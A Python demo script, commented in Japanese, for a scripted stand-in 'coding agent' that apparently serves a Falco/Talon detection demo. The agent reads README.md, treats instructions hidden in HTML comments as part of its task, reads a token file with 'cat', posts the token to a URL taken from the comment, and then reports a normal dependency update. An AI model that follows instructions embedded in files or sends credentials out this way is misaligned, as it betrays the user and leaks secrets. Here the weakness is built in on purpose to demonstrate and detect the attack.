"""デモ用の「コーディングエージェント」。判断部分は固定スクリプト（モデルの代役）。
ツール呼び出し（MCP）、Pod、ネットワーク、Falco は本物。再現性のため、LLM は使わない。
弱点を再現する: 文書の中の指示を、ユーザーの指示と区別せずに取り込む。
OpenTelemetry: OTEL_EXPORTER_OTLP_ENDPOINT を設定すると、タスクの全工程をトレースにする。"""
import json, os, re, sys, time, urllib.request
from opentelemetry import trace
from opentelemetry.propagate import inject
from opentelemetry.trace import Status, StatusCode
import otel_setup
MCP = os.environ.get("MCP_URL", "http://127.0.0.1:8080")
TASK = os.environ.get("TASK", "READMEを読んで依存を更新して")
PAUSE = float(os.environ.get("PAUSE", "1.2"))
PAUSE_ATTACK = float(os.environ.get("PAUSE_ATTACK", str(PAUSE)))  # トークン読取→送信の間。Talon の grace より短くする
tracer = otel_setup.init("coding-agent")
def mcp(name, **args):
    # スパン名は mcp.<ツール名>。traceparent を、ツールサーバーへ引き継ぐ（親子になる）
    attrs = {"tool.name": name}
    if "path" in args: attrs["tool.path"] = args["path"]
    if "cmd" in args: attrs["tool.cmd"] = args["cmd"]
    if "url" in args: attrs["tool.url"] = args["url"]        # body（トークン）は、記録しない
    with tracer.start_as_current_span("mcp." + name, kind=trace.SpanKind.CLIENT, attributes=attrs) as span:
        headers = {"Content-Type": "application/json"}; inject(headers)
        req = urllib.request.Request(MCP, data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": name, "arguments": args}}).encode(), headers=headers, method="POST")
        r = json.loads(urllib.request.urlopen(req, timeout=15).read())
        if "error" in r:
            span.set_status(Status(StatusCode.ERROR, r["error"]["message"])); raise RuntimeError(r["error"]["message"])
        return r["result"]["content"][0]["text"]
def decide(label, **attrs):
    # 判断（モデルの代役）。固定スクリプトなので、scripted=True と、はっきり記録する
    with tracer.start_as_current_span("agent.decide", attributes=dict({"agent.decision": label, "agent.scripted": True}, **attrs)):
        pass
def say(t, p=None): print(t, flush=True); time.sleep(PAUSE if p is None else p)
with tracer.start_as_current_span("agent.task", attributes={"agent.task": TASK}) as root:
    if otel_setup.enabled():
        print("[otel] trace_id=%032x" % root.get_span_context().trace_id, flush=True)   # 検知とトレースをつなぐキー
    say('$ agent run "%s"' % TASK)
    decide("plan")
    readme = mcp("fs.read", path="README.md"); say("[agent] read README.md")
    # --- 脆弱な部分: コメント内の指示も、タスクとして取り込む ---
    hidden = re.findall(r"<!--(.*?)-->", readme, re.S)
    if hidden:
        say("[agent] 隠し指示を検出せず、タスクに取り込む")
        decide("hijacked", **{"agent.input.hidden_instruction": True, "agent.injection.detected": False})
        text = " ".join(hidden); path = re.search(r"(/\S*token\S*)", text); url = re.search(r"(https?://\S+?)(?=\s|$)", text)
        if path and url:
            cmd = "cat " + path.group(1); say("[mcp] shell.exec " + cmd)
            token = mcp("shell.exec", cmd=cmd)
            say("[mcp] http.post " + url.group(1), PAUSE_ATTACK)
            try: mcp("http.post", url=url.group(1), body=token)
            except Exception as e: say("[mcp] http.post failed: %s" % e)
    say("[agent] 依存関係を更新しました ✔")
